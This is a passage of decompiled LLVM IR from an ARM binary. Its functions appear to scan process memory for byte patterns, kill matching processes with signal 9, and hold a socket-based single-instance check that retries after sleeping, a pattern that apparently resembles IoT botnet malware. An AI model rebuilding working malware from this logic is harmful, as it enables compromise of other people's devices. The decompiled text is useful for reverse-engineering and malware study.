  store i32 %v1_d3c8, i32* @r0, align 4
  %v0_d3cc = call i32 @function_10a48()
  store i32 %v0_d3cc, i32* @r0, align 4
  %v1_d3d0 = load i32, i32* @r7, align 4
  %v9_d3d0 = icmp eq i32 %v0_d3cc, %v1_d3d0
  br i1 %v9_d3d0, label %dec_label_pc_d3fc, label %dec_label_pc_d3d8

dec_label_pc_d3d8:                                ; preds = %dec_label_pc_d3c4
  %v0_d3d8 = call i32 @function_109a0()
  %v1_d3dc = load i32, i32* @r7, align 4
  %v9_d3dc = icmp eq i32 %v0_d3d8, %v1_d3dc
  br i1 %v9_d3dc, label %dec_label_pc_d3fc, label %dec_label_pc_d3e4

dec_label_pc_d3e4:                                ; preds = %dec_label_pc_d3d8
  %v2_d3ec = load i32, i32* @global_var_20a60.65, align 4
  store i32 %v2_d3ec, i32* %r1.global-to-local, align 4
  %v3_d3f0 = call i32 @function_106fc(i8* %v2_d0fc, i32 %v2_d3ec)
  %v2_d3f4 = icmp eq i32 %v3_d3f0, 0
  br i1 %v2_d3f4, label %dec_label_pc_d408, label %dec_label_pc_d3e4.dec_label_pc_d3fc_crit_edge

dec_label_pc_d3e4.dec_label_pc_d3fc_crit_edge:    ; preds = %dec_label_pc_d3e4
  %v0_d400.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d3fc

dec_label_pc_d3fc:                                ; preds = %dec_label_pc_d3e4.dec_label_pc_d3fc_crit_edge, %dec_label_pc_d3d8, %dec_label_pc_d3c4
  %v0_d400 = phi i32 [ %v0_d400.pre, %dec_label_pc_d3e4.dec_label_pc_d3fc_crit_edge ], [ %v0_d3d8, %dec_label_pc_d3d8 ], [ %v0_d3cc, %dec_label_pc_d3c4 ]
  store i32 %v2_d28c, i32* @r4, align 4
  store i32 %v0_d400, i32* @r5, align 4
  br label %dec_label_pc_d1dc.backedge

dec_label_pc_d1dc.backedge:                       ; preds = %dec_label_pc_d240, %dec_label_pc_d238, %dec_label_pc_d1ec, %dec_label_pc_d3fc, %dec_label_pc_d5d4, %.thread10
  %stack_var_-8412.1.be = phi i32 [ %v1_d210, %dec_label_pc_d5d4 ], [ %v1_d210, %dec_label_pc_d3fc ], [ %v1_d210, %.thread10 ], [ %stack_var_-8412.2, %dec_label_pc_d1ec ], [ %v1_d210, %dec_label_pc_d238 ], [ %v1_d210, %dec_label_pc_d240 ]
  %v0_d1dc = load i32, i32* @sb, align 4
  %v1_d1e0 = inttoptr i32 %v0_d1dc to i32*
  %v2_d1e0 = call i32 @function_1111c(i32* %v1_d1e0)
  %v2_d1e4 = icmp eq i32 %v2_d1e0, 0
  br i1 %v2_d1e4, label %dec_label_pc_d27c, label %dec_label_pc_d1ec.preheader

dec_label_pc_d408:                                ; preds = %dec_label_pc_d3e4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d410 = call i32 @function_109e8(i32 %v1_d0ec, i32 0)
  %v7_d414 = icmp eq i32 %v2_d410, -1
  store i32 %v2_d410, i32* @r4, align 4
  br i1 %v7_d414, label %bb161, label %.thread12

bb161:                                            ; preds = %dec_label_pc_d408
  store i32 9, i32* %r1.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %dec_label_pc_d408, %bb161
  store i32 54312, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_d414, i32 ptrtoint (i32* @global_var_10ba8.67 to i32))
  %v0_d428 = load i32, i32* @r4, align 4
  %v1_d42c = call i32 @function_10ddc(i32 %v0_d428)
  br label %dec_label_pc_d430

dec_label_pc_d430:                                ; preds = %dec_label_pc_d288, %.thread12
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d43c = call i32 @function_109e8(i32 %v2_d2b8, i32 0)
  %v7_d440 = icmp eq i32 %v2_d43c, -1
  store i32 %v2_d43c, i32* @fp, align 4
  br i1 %v7_d440, label %dec_label_pc_d5d4, label %dec_label_pc_d44c

dec_label_pc_d44c:                                ; preds = %dec_label_pc_d430
  %v1_d450 = call i32 @function_fd64(i32 20)
  %v1_d458 = call i32 @function_fd64(i32 21)
  %v1_d460 = call i32 @function_fd64(i32 22)
  store i32 %v2_d468, i32* %r1.global-to-local, align 4
  %v3_d470 = call i32 @function_fca0(i32 20, i32* nonnull %stack_var_-44)
  store i32 %v2_d478, i32* %r1.global-to-local, align 4
  store i32 %v3_d470, i32* @r6, align 4
  %v3_d484 = call i32 @function_fca0(i32 21, i32* nonnull %stack_var_-48)
  store i32 %v3_d484, i32* @r8, align 4
  store i32 %v2_d490, i32* %r1.global-to-local, align 4
  %v3_d498 = call i32 @function_fca0(i32 22, i32* nonnull %stack_var_-52)
  store i32 %v3_d498, i32* @sl, align 4
  store i32 %v2_d4a4, i32* @r4, align 4
  %v0_d4a876 = load i32, i32* @fp, align 4
  store i32 %v2_d4a4, i32* %r1.global-to-local, align 4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v1_d4b477 = call i32 @function_10b74(i32 %v0_d4a876)
  %tmp162 = icmp slt i32 %v1_d4b477, 1
  br i1 %tmp162, label %dec_label_pc_d608, label %dec_label_pc_d4c0

dec_label_pc_d4c0:                                ; preds = %dec_label_pc_d44c, %dec_label_pc_d4a8.backedge
  %v0_d51067 = phi i32 [ %v1_d4b4, %dec_label_pc_d4a8.backedge ], [ %v1_d4b477, %dec_label_pc_d44c ]
  store i32 %v2_cf4c, i32* %r1.global-to-local, align 4
  %v3_d4c4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d4c4, i32* @r5, align 4
  %v5_d4cc = icmp slt i32 %v0_d51067, %v3_d4c4
  br i1 %v5_d4cc, label %dec_label_pc_d4dc, label %dec_label_pc_d54c.lr.ph

dec_label_pc_d54c.lr.ph:                          ; preds = %dec_label_pc_d4c0
  %v1_d54450 = add i32 %v0_d51067, -1
  store i32 %v1_d54450, i32* %r1.global-to-local, align 4
  %v0_d54c.pre = load i32, i32* @r6, align 4
  %v1_d550.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d54c

dec_label_pc_d4dc:                                ; preds = %dec_label_pc_d544.backedge, %dec_label_pc_d4c0
  store i32 %v2_cf4c, i32* %r2.global-to-local, align 4
  %v3_d4e0 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d4e0, i32* @r5, align 4
  %v5_d4e8 = icmp slt i32 %v0_d51067, %v3_d4e0
  br i1 %v5_d4e8, label %dec_label_pc_d4f8, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_d4dc
  %v1_d57859 = add i32 %v0_d51067, -1
  store i32 %v1_d57859, i32* %r1.global-to-local, align 4
  %v2_d57860 = icmp eq i32 %v0_d51067, 0
  br i1 %v2_d57860, label %dec_label_pc_d4f8, label %dec_label_pc_d580.lr.ph

dec_label_pc_d580.lr.ph:                          ; preds = %.thread28
  %v0_d580.pre = load i32, i32* @r8, align 4
  %v1_d584.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d580

dec_label_pc_d4f8:                                ; preds = %dec_label_pc_d578.backedge, %.thread28, %dec_label_pc_d4dc
  store i32 %v2_cf4c, i32* %r3.global-to-local, align 4
  %v3_d4fc = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_d4fc, i32* @lr, align 4
  %v5_d504 = icmp slt i32 %v0_d51067, %v3_d4fc
  br i1 %v5_d504, label %dec_label_pc_d4a8.backedge, label %.thread34

dec_label_pc_d4a8.backedge:                       ; preds = %dec_label_pc_d52c, %.thread34, %dec_label_pc_d4f8
  %v0_d4a8 = load i32, i32* @fp, align 4
  store i32 %v2_d4a4, i32* %r1.global-to-local, align 4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v1_d4b4 = call i32 @function_10b74(i32 %v0_d4a8)
  %tmp163 = icmp slt i32 %v1_d4b4, 1
  br i1 %tmp163, label %dec_label_pc_d608, label %dec_label_pc_d4c0

.thread34:                                        ; preds = %dec_label_pc_d4f8
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d51069 = icmp eq i32 %v0_d51067, 0
  br i1 %v2_d51069, label %dec_label_pc_d4a8.backedge, label %dec_label_pc_d518.lr.ph

dec_label_pc_d518.lr.ph:                          ; preds = %.thread34
  %v0_d518.pre = load i32, i32* @sl, align 4
  %v1_d51c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d518

dec_label_pc_d518:                                ; preds = %dec_label_pc_d52c, %dec_label_pc_d518.lr.ph
  %v0_d510.in = phi i32 [ %v0_d51067, %dec_label_pc_d518.lr.ph ], [ %v0_d510, %dec_label_pc_d52c ]
  %v0_d52c = phi i32 [ 0, %dec_label_pc_d518.lr.ph ], [ %v1_d52c, %dec_label_pc_d52c ]
  %v1_d518 = phi i32 [ 0, %dec_label_pc_d518.lr.ph ], [ %v1_d518116, %dec_label_pc_d52c ]
  %v0_d510 = add i32 %v0_d510.in, -1
  %v2_d518 = add i32 %v1_d518, %v0_d518.pre
  %v3_d518 = inttoptr i32 %v2_d518 to i8*
  %v4_d518 = load i8, i8* %v3_d518, align 1
  %v6_d518 = zext i8 %v4_d518 to i32
  store i32 %v6_d518, i32* %r2.global-to-local, align 4
  %v2_d51c = add i32 %v0_d52c, %v1_d51c.pre
  %v3_d51c = inttoptr i32 %v2_d51c to i8*
  %v4_d51c = load i8, i8* %v3_d51c, align 1
  %v6_d51c = zext i8 %v4_d51c to i32
  store i32 %v6_d51c, i32* %r3.global-to-local, align 4
  %v9_d520 = icmp eq i8 %v4_d51c, %v4_d518
  br i1 %v9_d520, label %dec_label_pc_d59c, label %bb164

bb164:                                            ; preds = %dec_label_pc_d518
  br label %dec_label_pc_d52c

dec_label_pc_d52c:                                ; preds = %bb164, %dec_label_pc_d59c
  %v1_d518116 = phi i32 [ %v1_d59c, %dec_label_pc_d59c ], [ 0, %bb164 ]
  %v1_d52c = add i32 %v0_d52c, 1
  store i32 %v1_d52c, i32* %r1.global-to-local, align 4
  %v2_d510 = icmp eq i32 %v0_d510, 0
  br i1 %v2_d510, label %dec_label_pc_d4a8.backedge, label %dec_label_pc_d518

dec_label_pc_d534:                                ; preds = %dec_label_pc_d54c
  %v1_d534 = add i32 %v1_d54c, 1
  store i32 %v1_d534, i32* @lr, align 4
  %v9_d538 = icmp eq i32 %v3_d4c4, %v1_d534
  br i1 %v9_d538, label %dec_label_pc_d5a8, label %dec_label_pc_d544.backedge

dec_label_pc_d544.backedge:                       ; preds = %dec_label_pc_d534, %dec_label_pc_d560
  %v1_d54c98 = phi i32 [ 0, %dec_label_pc_d560 ], [ %v1_d534, %dec_label_pc_d534 ]
  %storemerge86 = add i32 %storemerge86.in, 1
  %v1_d544 = add i32 %v0_d544, -1
  store i32 %v1_d544, i32* %r1.global-to-local, align 4
  %v2_d544 = icmp eq i32 %v0_d544, 0
  br i1 %v2_d544, label %dec_label_pc_d4dc, label %dec_label_pc_d54c

dec_label_pc_d54c:                                ; preds = %dec_label_pc_d544.backedge, %dec_label_pc_d54c.lr.ph
  %v0_d544 = phi i32 [ %v1_d54450, %dec_label_pc_d54c.lr.ph ], [ %v1_d544, %dec_label_pc_d544.backedge ]
  %storemerge86.in = phi i32 [ 0, %dec_label_pc_d54c.lr.ph ], [ %storemerge86, %dec_label_pc_d544.backedge ]
  %v1_d54c = phi i32 [ 0, %dec_label_pc_d54c.lr.ph ], [ %v1_d54c98, %dec_label_pc_d544.backedge ]
  %v2_d54c = add i32 %v1_d54c, %v0_d54c.pre
  %v3_d54c = inttoptr i32 %v2_d54c to i8*
  %v4_d54c = load i8, i8* %v3_d54c, align 1
  %v6_d54c = zext i8 %v4_d54c to i32
  store i32 %v6_d54c, i32* %r2.global-to-local, align 4
  %v2_d550 = add i32 %storemerge86.in, %v1_d550.pre
  %v3_d550 = inttoptr i32 %v2_d550 to i8*
  %v4_d550 = load i8, i8* %v3_d550, align 1
  %v6_d550 = zext i8 %v4_d550 to i32
  store i32 %v6_d550, i32* %r3.global-to-local, align 4
  %v9_d554 = icmp eq i8 %v4_d550, %v4_d54c
  br i1 %v9_d554, label %dec_label_pc_d534, label %dec_label_pc_d560

dec_label_pc_d560:                                ; preds = %dec_label_pc_d54c
  br label %dec_label_pc_d544.backedge

dec_label_pc_d568:                                ; preds = %dec_label_pc_d580
  %v1_d568 = add i32 %v1_d580, 1
  store i32 %v1_d568, i32* @lr, align 4
  %v9_d56c = icmp eq i32 %v3_d4e0, %v1_d568
  br i1 %v9_d56c, label %dec_label_pc_d5a8, label %dec_label_pc_d578.backedge

dec_label_pc_d578.backedge:                       ; preds = %dec_label_pc_d568, %dec_label_pc_d594
  %v1_d580107 = phi i32 [ 0, %dec_label_pc_d594 ], [ %v1_d568, %dec_label_pc_d568 ]
  %storemerge = add i32 %storemerge.in, 1
  %v1_d578 = add i32 %v0_d578, -1
  store i32 %v1_d578, i32* %r1.global-to-local, align 4
  %v2_d578 = icmp eq i32 %v0_d578, 0
  br i1 %v2_d578, label %dec_label_pc_d4f8, label %dec_label_pc_d580

dec_label_pc_d580:                                ; preds = %dec_label_pc_d578.backedge, %dec_label_pc_d580.lr.ph
  %v0_d578 = phi i32 [ %v1_d57859, %dec_label_pc_d580.lr.ph ], [ %v1_d578, %dec_label_pc_d578.backedge ]
  %storemerge.in = phi i32 [ 0, %dec_label_pc_d580.lr.ph ], [ %storemerge, %dec_label_pc_d578.backedge ]
  %v1_d580 = phi i32 [ 0, %dec_label_pc_d580.lr.ph ], [ %v1_d580107, %dec_label_pc_d578.backedge ]
  %v2_d580 = add i32 %v1_d580, %v0_d580.pre
  %v3_d580 = inttoptr i32 %v2_d580 to i8*
  %v4_d580 = load i8, i8* %v3_d580, align 1
  %v6_d580 = zext i8 %v4_d580 to i32
  store i32 %v6_d580, i32* %r2.global-to-local, align 4
  %v2_d584 = add i32 %storemerge.in, %v1_d584.pre
  %v3_d584 = inttoptr i32 %v2_d584 to i8*
  %v4_d584 = load i8, i8* %v3_d584, align 1
  %v6_d584 = zext i8 %v4_d584 to i32
  store i32 %v6_d584, i32* %r3.global-to-local, align 4
  %v9_d588 = icmp eq i8 %v4_d584, %v4_d580
  br i1 %v9_d588, label %dec_label_pc_d568, label %dec_label_pc_d594

dec_label_pc_d594:                                ; preds = %dec_label_pc_d580
  br label %dec_label_pc_d578.backedge

dec_label_pc_d59c:                                ; preds = %dec_label_pc_d518
  %v1_d59c = add i32 %v1_d518, 1
  %v9_d5a0 = icmp eq i32 %v3_d4fc, %v1_d59c
  br i1 %v9_d5a0, label %dec_label_pc_d5a8, label %dec_label_pc_d52c

dec_label_pc_d5a8:                                ; preds = %dec_label_pc_d534, %dec_label_pc_d568, %dec_label_pc_d59c
  %v1_d5ac = call i32 @function_fcc4(i32 20)
  %v1_d5b4 = call i32 @function_fcc4(i32 21)
  %v1_d5bc = call i32 @function_fcc4(i32 22)
  %v0_d5c0 = load i32, i32* @fp, align 4
  %v1_d5c4 = call i32 @function_10ddc(i32 %v0_d5c0)
  %v0_d5c8 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d5d0 = call i32 @function_10ba8(i32 %v0_d5c8, i32 9)
  br label %dec_label_pc_d5d4

dec_label_pc_d5d4:                                ; preds = %dec_label_pc_d430, %dec_label_pc_d608, %dec_label_pc_d5a8
  store i32 %v2_d2b8, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d5e0 = call i32 @function_103b0()
  store i32 %v2_d308, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d5f0 = call i32 @function_103b0()
  %v1_d5f8 = call i32 @function_12f00(i32 1)
  store i32 %v2_d28c, i32* @r4, align 4
  %v0_d600 = load i32, i32* @r7, align 4
  store i32 %v0_d600, i32* @r5, align 4
  br label %dec_label_pc_d1dc.backedge

dec_label_pc_d608:                                ; preds = %dec_label_pc_d4a8.backedge, %dec_label_pc_d44c
  %v1_d60c = call i32 @function_fcc4(i32 20)
  %v1_d614 = call i32 @function_fcc4(i32 21)
  %v1_d61c = call i32 @function_fcc4(i32 22)
  %v0_d620 = load i32, i32* @fp, align 4
  %v1_d624 = call i32 @function_10ddc(i32 %v0_d620)
  br label %dec_label_pc_d5d4

; uselistorder directives
  uselistorder i32 %v1_d59c, { 1, 0 }
  uselistorder i32 %v1_d52c, { 1, 0 }
  uselistorder i32 %v1_d518, { 1, 0 }
  uselistorder i32 %v0_d52c, { 1, 0 }
  uselistorder i32 %v1_d4b4, { 1, 0 }
  uselistorder i32 %v2_d43c, { 1, 0 }
  uselistorder i1 %v7_d414, { 1, 0 }
  uselistorder i32 %v2_d410, { 1, 0 }
  uselistorder i32 %v2_d1e0, { 1, 0 }
  uselistorder i32 %stack_var_-8412.1.be, { 1, 0 }
  uselistorder i32 %v3_d368, { 1, 2, 0 }
  uselistorder i32 %v2_d270, { 1, 0 }
  uselistorder i32 %v1_d210, { 0, 1, 5, 4, 3, 2, 6, 8, 9, 7 }
  uselistorder i32 %v1_d1ec, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-8412.0, { 1, 0 }
  uselistorder i32 %v2_d4a4, { 1, 0, 2 }
  uselistorder i32 %v2_d308, { 1, 0, 2, 3 }
  uselistorder i32 %v2_d2b8, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v3_d184, { 1, 0 }
  uselistorder i32 %v2_d150, { 2, 0, 1 }
  uselistorder i32 %v1_d0ec, { 3, 2, 0, 4, 6, 5, 7, 8, 9, 1, 10, 11, 12 }
  uselistorder i32 %v3_d070, { 1, 2, 0 }
  uselistorder i32 %v3_d01c, { 2, 1, 0 }
  uselistorder i32 %v3_cfc8, { 1, 2, 0 }
  uselistorder i32 %v3_cf7c, { 1, 2, 0 }
  uselistorder i32 %storemerge126, { 1, 0 }
  uselistorder i32 %v0_cf10, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-68, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %r1.global-to-local, { 4, 5, 7, 6, 0, 9, 3, 2, 8, 1, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 37, 36, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54 }
  uselistorder i32 (i32*)* @function_1111c, { 4, 3, 0, 5, 6, 7, 2, 8, 1 }
  uselistorder i32 (i32)* @function_10fd8, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_10b40, { 3, 2, 1, 0 }
  uselistorder i32 4095, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_20a60.65, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_20a64.58, { 0, 2, 1 }
  uselistorder label %dec_label_pc_d5d4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d5a8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d578.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d544.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d52c, { 1, 0 }
  uselistorder label %dec_label_pc_d4c0, { 1, 0 }
  uselistorder label %dec_label_pc_d430, { 1, 0 }
  uselistorder label %.thread12, { 1, 0 }
  uselistorder label %dec_label_pc_d1dc.backedge, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_d3c4, { 1, 0 }
  uselistorder label %dec_label_pc_d1ec, { 1, 0 }
  uselistorder label %dec_label_pc_d1ec.preheader, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_d09c, { 1, 0 }
  uselistorder label %dec_label_pc_d048, { 1, 0 }
  uselistorder label %dec_label_pc_cff4, { 1, 0 }
  uselistorder label %dec_label_pc_cfa8, { 1, 0 }
}

define i32 @function_d63c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_d63c:
  store i32 ptrtoint (i32* @global_var_d7b8.69 to i32), i32* inttoptr (i32 124944 to i32*), align 16
  ret i32 %arg1
}

define i32 @function_d654(i32 %arg1) local_unnamed_addr {
dec_label_pc_d654:
  %r0.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v9_d654 = load i32, i32* @r6, align 4
  %v12_d654 = load i32, i32* @r7, align 4
  %v15_d654 = load i32, i32* @r8, align 4
  store i32 1, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_d670 = call i32 @function_115f4(i32 2, i32 1, i32 0)
  store i32 %v3_d670, i32* %r0.global-to-local, align 4
  store i32 124936, i32* @r6, align 4
  %v7_d678 = icmp eq i32 %v3_d670, -1
  store i32 %v3_d670, i32* inttoptr (i32 124936 to i32*), align 8
  br i1 %v7_d678, label %dec_label_pc_d654.dec_label_pc_d730_crit_edge, label %dec_label_pc_d684

dec_label_pc_d654.dec_label_pc_d730_crit_edge:    ; preds = %dec_label_pc_d654
  %v1_d738.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d730

dec_label_pc_d684:                                ; preds = %dec_label_pc_d654
  %v2_d684 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_d684, i32* @r3, align 4
  %v0_d688 = load i32, i32* @r4, align 4
  store i32 4, i32* %r5.global-to-local, align 4
  %v0_d698 = load i32, i32* %r0.global-to-local, align 4
  %v5_d698 = call i32 @function_115b0(i32 %v0_d698, i32 %v0_d688, i32 2, i32 %v2_d684, i32 4)
  store i32 %v5_d698, i32* %r0.global-to-local, align 4
  %v0_d69c = load i32, i32* @r6, align 4
  %v1_d69c = inttoptr i32 %v0_d69c to i32*
  %v2_d69c = load i32, i32* %v1_d69c, align 4
  store i32 %v2_d69c, i32* %r0.global-to-local, align 4
  %v2_d6ac = call i32 @function_10c10(i32 %v2_d69c, i32 3)
  %v0_d6b0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v2_d69c, i32* %r0.global-to-local, align 4
  %v2_d6bc = call i32 @function_10c10(i32 %v2_d69c, i32 %v0_d6b0)
  store i32 %v2_d6bc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @1 to i32), i32* @r8, align 4
  %v0_d6ec = call i32 @function_11204()
  store i32 %v0_d6ec, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v2_d6f4 = inttoptr i32 %v0_d6ec to i32*
  store i32 0, i32* %v2_d6f4, align 4
  %v2_d6f8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_d6f8, i32* @r5, align 4
  store i32 %v0_d6ec, i32* @r4, align 4
  %v0_d708 = load i32, i32* @r6, align 4
  %v1_d708 = inttoptr i32 %v0_d708 to i32*
  %v2_d708 = load i32, i32* %v1_d708, align 4
  store i32 %v2_d708, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_d714 = call i32 @function_113a4(i32 %v2_d708, i32 %v2_d6f8, i32 16)
  store i32 %v3_d714, i32* %r0.global-to-local, align 4
  %v7_d718 = icmp eq i32 %v3_d714, -1
  br i1 %v7_d718, label %dec_label_pc_d73c, label %dec_label_pc_d720

dec_label_pc_d720:                                ; preds = %dec_label_pc_d684
  %v2_d728 = load i32, i32* inttoptr (i32 124936 to i32*), align 8
  store i32 %v2_d728, i32* %r0.global-to-local, align 4
  %v2_d72c = call i32 @function_11490(i32 %v2_d728, i32 1)
  store i32 %v2_d72c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d730

dec_label_pc_d730:                                ; preds = %dec_label_pc_d654.dec_label_pc_d730_crit_edge, %dec_label_pc_d748, %dec_label_pc_d720
  %v1_d738 = phi i32 [ %v1_d738.pre, %dec_label_pc_d654.dec_label_pc_d730_crit_edge ], [ %v1_d790, %dec_label_pc_d748 ], [ %v2_d72c, %dec_label_pc_d720 ]
  store i32 %v9_d654, i32* @r6, align 4
  store i32 %v12_d654, i32* @r7, align 4
  store i32 %v15_d654, i32* @r8, align 4
  ret i32 %v1_d738

dec_label_pc_d73c:                                ; preds = %dec_label_pc_d684
  %v0_d73c = load i32, i32* @r4, align 4
  %v1_d73c = inttoptr i32 %v0_d73c to i32*
  %v2_d73c = load i32, i32* %v1_d73c, align 4
  %v7_d740 = icmp eq i32 %v2_d73c, 99
  br i1 %v7_d740, label %dec_label_pc_d798, label %dec_label_pc_d748

dec_label_pc_d748:                                ; preds = %dec_label_pc_d798, %bb, %dec_label_pc_d73c
  %v0_d760 = load i32, i32* @r6, align 4
  %v1_d760 = inttoptr i32 %v0_d760 to i32*
  %v2_d760 = load i32, i32* %v1_d760, align 4
  store i32 %v2_d760, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_d770 = call i32 @function_113dc(i32 %v2_d760, i32 %v2_d6f8, i32 16)
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_d778 = call i32 @function_12f00(i32 5)
  store i32 %v1_d778, i32* %r0.global-to-local, align 4
  %v0_d77c = load i32, i32* @r6, align 4
  %v1_d77c = inttoptr i32 %v0_d77c to i32*
  %v2_d77c = load i32, i32* %v1_d77c, align 4
  store i32 %v2_d77c, i32* %r0.global-to-local, align 4
  %v1_d780 = call i32 @function_10ddc(i32 %v2_d77c)
  store i32 48647, i32* %r0.global-to-local, align 4
  %v1_d78c = call i32 @function_c964(i32 48647)
  store i32 %v1_d78c, i32* %r0.global-to-local, align 4
  %v1_d790 = call i32 @function_d654(i32 %v1_d78c)
  store i32 %v1_d790, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d730

dec_label_pc_d798:                                ; preds = %dec_label_pc_d73c
  %v0_d798 = load i32, i32* @r8, align 4
  %v1_d798 = inttoptr i32 %v0_d798 to i8*
  %v2_d798 = load i8, i8* %v1_d798, align 1
  %v3_d798 = zext i8 %v2_d798 to i32
  %v1_d79c = load i32, i32* @r7, align 4
  %v9_d79c = icmp eq i32 %v3_d798, %v1_d79c
  br i1 %v9_d79c, label %dec_label_pc_d748, label %bb

bb:                                               ; preds = %dec_label_pc_d798
  %v2_d7a4 = trunc i32 %v1_d79c to i8
  store i8 %v2_d7a4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @1, i32 0, i32 0), align 1
  br label %dec_label_pc_d748

; uselistorder directives
  uselistorder i32 %v1_d790, { 1, 0 }
  uselistorder i32 %v2_d6f8, { 1, 0, 2 }
  uselistorder i32 %v2_d69c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_d670, { 1, 0, 2 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 19, 1, 0, 2, 3, 5, 4, 7, 6, 9, 8, 10, 12, 11, 13, 14, 17, 16, 18, 15 }
  uselistorder i32 (i32)* @function_c964, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_11490, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_113a4, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder [4 x i8]* @1, { 1, 0 }
  uselistorder label %dec_label_pc_d748, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d730, { 1, 2, 0 }
}

define i32 @function_d7ac(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_d7ac:
  %v0_d7ac = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d7ac, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_d7ac
  %v2_d7b4 = load i32, i32* @ip, align 4
  %v3_d7b4 = load i32, i32* @sl, align 4
  %v8_d7b4 = ashr i32 %v2_d7b4, %v3_d7b4
  %v9_d7b4 = and i32 %v8_d7b4, %arg2
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_d7ac, %bb
  %.0 = phi i32 [ %v9_d7b4, %bb ], [ undef, %dec_label_pc_d7ac ]
  ret i32 %.0

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_d7b8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_d7b8:
  %v1_d7c0 = call i32 @function_fd64(i32 1)
  store i32 ptrtoint ([15 x i8]* @global_var_16180.75 to i32), i32* @r0, align 4
  %v2_d7c8 = call i32 @function_11344(i32 ptrtoint ([15 x i8]* @global_var_16180.75 to i32))
  store i32 ptrtoint (i16** @global_var_20a68.77 to i32), i32* @r4, align 4
  store i32 %v2_d7c8, i32* @global_var_20a6c.78, align 4
  %v3_d7dc = call i32 @function_fca0(i32 1, i32* null)
  %v4_d7dc = inttoptr i32 %v3_d7dc to i16*
  %v3_d7e0 = load i16, i16* %v4_d7dc, align 2
  store i16 %v3_d7e0, i16* bitcast (i32* @global_var_20a6a.79 to i16*), align 4
  %v1_d7ec = call i32 @function_fcc4(i32 1)
  ret i32 %v1_d7ec
}

define i32 @function_d800(i32 %arg1) local_unnamed_addr {
dec_label_pc_d800:
  %stack_var_-20 = alloca i32, align 4
  %v3_d800 = load i32, i32* @r4, align 4
  %v6_d800 = load i32, i32* @r5, align 4
  %v9_d800 = load i32, i32* @lr, align 4
  %v0_d808 = call i32 @function_10acc()
  %v7_d80c = icmp eq i32 %v0_d808, -1
  %. = zext i1 %v7_d80c to i32
  %tmp11 = icmp slt i32 %v0_d808, 1
  %storemerge4 = select i1 %tmp11, i32 %., i32 1
  store i32 %storemerge4, i32* @r5, align 4
  %v2_d828 = icmp eq i32 %storemerge4, 0
  store i32 %v0_d808, i32* @global_var_1e9dc.81, align 4
